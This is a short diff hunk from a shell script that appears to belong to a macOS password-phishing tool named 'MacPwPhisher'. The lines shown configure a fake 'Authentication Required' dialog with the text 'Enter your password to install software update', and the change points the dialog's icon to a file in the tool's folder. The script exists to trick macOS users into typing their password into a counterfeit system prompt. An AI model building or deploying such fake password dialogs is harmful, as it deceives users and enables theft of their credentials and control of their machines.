@@ -7,7 +7,7 @@ title="Authentication Required"
 # The alert's text
 dialog="Enter your password to install software update."
 # The alert's icon (for ex. "stop", "caution", "note")
-icon_path="tmp:icon.png"
+icon_path="Macintosh HD:Users:$(whoami):MacPwPhisher-main:icon.png"
 # A custom application, that should open the alert (for ex. "Finder")
 app=""
 # Base64 encode the entered string to prevent an injection/error
